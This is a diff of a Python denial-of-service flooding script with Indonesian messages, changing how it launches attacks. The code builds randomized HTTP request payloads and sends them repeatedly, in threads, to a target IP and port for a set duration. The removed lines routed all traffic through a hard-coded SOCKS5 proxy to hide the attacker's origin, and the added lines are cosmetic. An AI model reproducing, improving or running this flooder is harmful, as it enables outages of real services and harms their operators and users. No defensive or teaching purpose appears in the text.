@@ -1,6 +1,5 @@
-# SOCKS5 dan semua module
+# CHECK IMPORT
 try:
-    import socks
     import socket
     import threading
     import string
@@ -10,20 +9,19 @@ try:
     import platform
     import sys
     import select
-    from colorama import Fore
+    from colorama import Fore, init
 except ModuleNotFoundError as e:
     print(f"{e} CAN'T IMPORT . . . . ")
     exit()
 
-# Pasang default socket ke SOCKS5
-socks.set_default_proxy(socks.SOCKS5, "184.170.251.30", 11288)
-socket.socket = socks.socksocket
-
+init(autoreset=True)
 stop_attack = threading.Event()
 
+# Clear screen
 def clear_text():
     os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')
 
+# Generate random URL path
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     return "".join(random.sample(msg, int(num)))
@@ -32,6 +30,7 @@ def generate_url_path_choice(num):
     letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
     return ''.join(random.choice(letter) for _ in range(int(num)))
 
+# Attack logic
 def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet):
     if stop_attack.is_set():
         return
@@ -45,7 +44,6 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
             'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n",
         }
         packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
-        s.settimeout(5)
         s.connect((ip, port))
         for _ in range(booter_sent):
             if stop_attack.is_set():
@@ -65,22 +63,27 @@ def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loade
             th.start()
             th.join()
 
+# Countdown + interrupt
 def countdown_timer(time_loader):
     remaining = int(time_loader - time.time())
     while remaining > 0 and not stop_attack.is_set():
         sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
         sys.stdout.flush()
+
         if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
             _ = sys.stdin.readline()
             stop_attack.set()
             print(f"\n{Fore.RED}Serangan Dihentikan{Fore.RESET}")
             return
+
         time.sleep(1)
         remaining = int(time_loader - time.time())
+
     if not stop_attack.is_set():
         print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
         stop_attack.set()
 
+# Exit confirm
 def confirm_exit():
     while True:
         choice = input(f"{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}").lower()
@@ -91,6 +94,7 @@ def confirm_exit():
             print()
             return
 
+# MAIN COMMAND LOOP
 def command():
     global stop_attack
     while True:
@@ -146,9 +150,13 @@ def command():
             sys.exit(0)
 
 if __name__ == "__main__":
-    try:
-        command()
-    except KeyboardInterrupt:
-        print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
-        stop_attack.set()
-        sys.exit(0)
+    ascii_art = f"""{Fore.LIGHTBLACK_EX}
+    _     
+   (_)
+  _|_|_
+  (_*_)
+/_______\
+
+{Fore.RESET}"""
+    print(ascii_art)
+    command()
